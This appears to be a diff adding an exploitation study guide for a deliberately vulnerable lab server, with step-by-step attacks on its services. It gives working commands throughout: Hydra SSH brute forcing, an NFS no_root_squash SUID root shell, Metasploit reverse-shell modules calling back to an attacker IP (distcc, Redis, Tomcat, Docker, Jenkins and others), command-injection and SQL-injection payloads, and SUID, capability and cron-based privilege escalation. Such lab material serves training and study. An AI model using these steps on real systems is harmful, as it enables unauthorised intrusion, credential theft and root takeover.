@@ -1,0 +1,220 @@
+# DefendShield Vulnerable Server - Exploitation Study Guide
+
+This guide provides step-by-step instructions to exploit the vulnerabilities present in the DefendShield Vulnerable Server.
+
+**Target IP**: Replace `<TARGET_IP>` with the IP address of the vulnerable server.
+**Attacker IP**: Replace `<ATTACKER_IP>` with your Kali Linux/Attacker IP.
+
+---
+
+## 1. Network Services Exploitation
+
+### FTP (Port 21) - Anonymous Access
+**Vulnerability**: VSFTPD is configured to allow anonymous login and file uploads.
+**Exploitation**:
+1.  Connect to FTP: `ftp <TARGET_IP>`
+2.  Login as `anonymous` with any password.
+3.  List files: `ls -la`
+4.  Upload a malicious file (e.g., a PHP shell if the directory is web-accessible, though usually it's just for data exfiltration/storage):
+    ```bash
+    put shell.php
+    ```
+
+### Telnet (Port 23) - Cleartext Credential Sniffing
+**Vulnerability**: Telnet sends credentials in cleartext.
+**Exploitation**:
+1.  Use Wireshark on the network to capture traffic.
+2.  Filter for `telnet`.
+3.  Wait for a user to login (or simulate it).
+4.  Follow TCP Stream to see the username and password.
+
+### SSH (Port 22) - Weak Credentials
+**Vulnerability**: Weak passwords for users.
+**Exploitation**:
+1.  Use Hydra to brute force:
+    ```bash
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+    ```
+2.  Credentials found: `admin:password123`, `dev:123456`.
+
+### SMB (Port 445) - Public Share
+**Vulnerability**: Publicly writable share.
+**Exploitation**:
+1.  List shares: `smbclient -L //<TARGET_IP>`
+2.  Connect to public share: `smbclient //<TARGET_IP>/public`
+3.  Upload/Download files.
+
+### NFS (Port 2049) - No Root Squash
+**Vulnerability**: The `/srv/nfs/share` export has `no_root_squash` enabled.
+**Exploitation**:
+1.  Check exports: `showmount -e <TARGET_IP>`
+2.  Mount the share:
+    ```bash
+    mkdir /tmp/nfs_mount
+    mount -t nfs <TARGET_IP>:/srv/nfs/share /tmp/nfs_mount
+    ```
+3.  As root on your attacker machine, create a binary with SUID bit:
+    ```bash
+    cp /bin/bash /tmp/nfs_mount/root_shell
+    chmod +s /tmp/nfs_mount/root_shell
+    ```
+4.  On the victim machine (via SSH as low priv user), execute `/srv/nfs/share/root_shell -p` to gain root.
+
+### Distcc (Port 3632) - Remote Code Execution
+**Vulnerability**: Distcc daemon allows unauthenticated command execution.
+**Metasploit Module**: `exploit/unix/misc/distcc_exec`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use exploit/unix/misc/distcc_exec`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set PAYLOAD cmd/unix/reverse`
+5.  `set LHOST <ATTACKER_IP>`
+6.  `run` -> **Shell Access**
+
+### Redis (Port 6379) - Unauthenticated RCE
+**Vulnerability**: Redis is exposed without a password and protected mode disabled.
+**Metasploit Module**: `exploit/linux/redis/redis_replication_cmd_exec`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use exploit/linux/redis/redis_replication_cmd_exec`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set LHOST <ATTACKER_IP>`
+5.  `run` -> **Meterpreter Session**
+
+### PostgreSQL (Port 5432) - Weak Credentials & RCE
+**Vulnerability**: Default/Weak password (`postgres:postgres`) and exposed port.
+**Metasploit Module**: `exploit/linux/postgres/postgres_payload`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use exploit/linux/postgres/postgres_payload`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set PASSWORD postgres`
+5.  `set LHOST <ATTACKER_IP>`
+6.  `run` -> **Meterpreter Session**
+
+### Tomcat (Port 8080) - WAR Upload RCE
+**Vulnerability**: Manager app accessible with `tomcat:tomcat`.
+**Metasploit Module**: `exploit/multi/http/tomcat_mgr_upload`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use exploit/multi/http/tomcat_mgr_upload`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set RPORT 8080`
+5.  `set HttpPassword tomcat`
+6.  `set HttpUsername tomcat`
+7.  `set LHOST <ATTACKER_IP>`
+8.  `run` -> **Meterpreter Session**
+
+### Backdoor (Port 1337)
+**Vulnerability**: Custom listener shell.
+**Exploitation**:
+1.  Connect with Netcat: `nc <TARGET_IP> 1337`
+2.  Direct root/user shell access.
+
+### VNC (Port 5901) - Weak Password
+**Vulnerability**: VNC server configured with weak password (`password`).
+**Metasploit Module**: `auxiliary/scanner/vnc/vnc_login`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use auxiliary/scanner/vnc/vnc_login`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set RPORT 5901`
+5.  `run` -> **Found password: password**
+6.  Connect: `vncviewer <TARGET_IP>:5901`
+
+### SNMP (Port 161) - Public Community
+**Vulnerability**: SNMP configured with `public` community string.
+**Metasploit Module**: `auxiliary/scanner/snmp/snmp_enum`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use auxiliary/scanner/snmp/snmp_enum`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `run` -> **Enumerates system info, users, processes**
+
+### Docker API (Port 2375) - Unauthenticated Root Access
+**Vulnerability**: Docker socket exposed over TCP without authentication.
+**Metasploit Module**: `exploit/linux/http/docker_daemon_tcp`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use exploit/linux/http/docker_daemon_tcp`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set LHOST <ATTACKER_IP>`
+5.  `set TARGET 0` (Automatic)
+6.  `run` -> **Root Shell (Container Escape)**
+
+### Elasticsearch (Port 9200) - Remote Code Execution
+**Vulnerability**: CVE-2014-3120 (Old version with dynamic scripting enabled).
+**Metasploit Module**: `exploit/multi/elasticsearch/script_mvel_rce`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use exploit/multi/elasticsearch/script_mvel_rce`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set LHOST <ATTACKER_IP>`
+5.  `run` -> **Meterpreter Session**
+
+### Jenkins (Port 8083) - Script Console RCE
+**Vulnerability**: Unauthenticated access to Groovy Script Console.
+**Metasploit Module**: `exploit/multi/http/jenkins_script_console`
+**Exploitation**:
+1.  Start Metasploit: `msfconsole`
+2.  `use exploit/multi/http/jenkins_script_console`
+3.  `set RHOSTS <TARGET_IP>`
+4.  `set RPORT 8083`
+5.  `set TARGETURI /`
+6.  `set LHOST <ATTACKER_IP>`
+7.  `run` -> **Meterpreter Session**
+
+---
+
+## 2. Web Application Exploitation
+
+### Custom PHP App (Port 80)
+**Vulnerability**: Command Injection in "Ping Tool".
+**Exploitation**:
+1.  Go to `http://<TARGET_IP>/`
+2.  In the Ping IP field, enter: `127.0.0.1; cat /etc/passwd`
+3.  Observe the output of the command.
+
+### OWASP Juice Shop (Port 3000)
+**Vulnerability**: SQL Injection (Login).
+**Exploitation**:
+1.  Go to Login page.
+2.  Email: `' or 1=1--`
+3.  Password: `anything`
+4.  Login as Admin.
+
+### DVWA (Port 8081)
+**Vulnerability**: Command Injection (Low Security).
+**Exploitation**:
+1.  Login (`admin:password`).
+2.  Go to "Command Injection".
+3.  Enter `127.0.0.1; ls -la`.
+
+---
+
+## 3. Privilege Escalation
+
+### SUID Binaries
+**Vulnerability**: `find` command has SUID bit set.
+**Exploitation**:
+1.  SSH as `guest` or `dev`.
+2.  Run: `find . -exec /bin/sh -p \; -quit`
+3.  **Root Shell**.
+
+### Capabilities
+**Vulnerability**: `python3` has `cap_setuid` capability.
+**Exploitation**:
+1.  SSH as low priv user.
+2.  Run: `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+3.  **Root Shell**.
+
+### Cron Job
+**Vulnerability**: Writable script running as root.
+**Exploitation**:
+1.  Check `/etc/crontab` or monitor processes to see `/usr/local/bin/cleanup.sh` running.
+2.  Edit the script:
+    ```bash
+    echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /usr/local/bin/cleanup.sh
+    ```
+3.  Wait for cron to run (1 minute).
+4.  Execute `/tmp/rootbash -p` -> **Root Shell**.
